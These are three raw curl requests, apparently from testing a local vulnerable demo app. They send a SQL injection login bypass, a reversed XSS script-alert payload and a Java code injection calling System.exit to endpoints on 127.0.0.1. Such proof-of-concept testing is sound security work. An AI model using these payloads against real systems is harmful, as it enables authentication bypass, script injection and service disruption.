curl 'http://127.0.0.1:8080/sqlijc' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://127.0.0.1:8080' -H 'Connection: keep-alive' -H 'Referer: http://127.0.0.1:8080/sqlijc' -H 'Cookie: JSESSIONID=8A40D9E7F9B6A1E471F6ABF352C28D6D; screenResolution=1920x969' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'name=test&password=%27+OR+%271%27%3D%271'


curl 'http://127.0.0.1:8080/xss' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://127.0.0.1:8080' -H 'Connection: keep-alive' -H 'Referer: http://127.0.0.1:8080/xss' -H 'Cookie: JSESSIONID=A3D0673AB07D693219149883D504B16D; screenResolution=1920x969' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'string=%3Etpircs%2F%3C%29%22ssx%22%28trela%3Etpircs%3C'


curl 'http://127.0.0.1:8080/codeijc' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://127.0.0.1:8080' -H 'Connection: keep-alive' -H 'Referer: http://127.0.0.1:8080/codeijc' -H 'Cookie: JSESSIONID=8A40D9E7F9B6A1E471F6ABF352C28D6D; screenResolution=1920x969' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'jsonString=%7B%7D%27%29%3Bjava.lang.System.exit%280%29%3B%2F%2F'